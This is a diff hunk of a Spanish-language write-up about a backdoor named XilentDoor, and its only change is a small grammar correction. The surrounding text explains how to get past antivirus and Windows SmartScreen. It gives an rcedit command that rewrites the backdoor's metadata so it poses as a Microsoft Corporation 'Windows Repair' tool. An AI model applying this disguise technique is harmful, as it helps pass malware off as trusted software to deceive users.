@@ -78,7 +78,7 @@ En las pruebas realizadas con el backdoor, los antivirus externos no detectan su
 
 Para evadir SmartScreen, podemos firmar el ejecutable con un certificado digital (lo ideal es adquirir un certificado de firma de código, Code Signing Certificate) o bien empaquetar el instalador (.EXE/.MSI) y modificar sus metadatos para reducir su detectabilidad.
 
-Primero debemos de modificar los metadatos y para ellos podemos usar herramientas como <a href="https://www.angusj.com/resourcehacker/">Resource Hacker</a> o <a href="https://github.com/electron/rcedit/releases">Recedit</a>.
+Primero debemos de modificar los metadatos y para ello podemos usar herramientas como <a href="https://www.angusj.com/resourcehacker/">Resource Hacker</a> o <a href="https://github.com/electron/rcedit/releases">Recedit</a>.
 ```
 rcedit-x64.exe XilentDoor.exe --set-version-string "CompanyName" "Microsoft Corporation" --set-version-string "ProductName" "Windows Tool" --set-version-string "FileDescription" "Windows Repair" --set-file-version "1.3.5.0" --set-product-version "1.2.5.0" --set-icon "icon.ico"
 ```
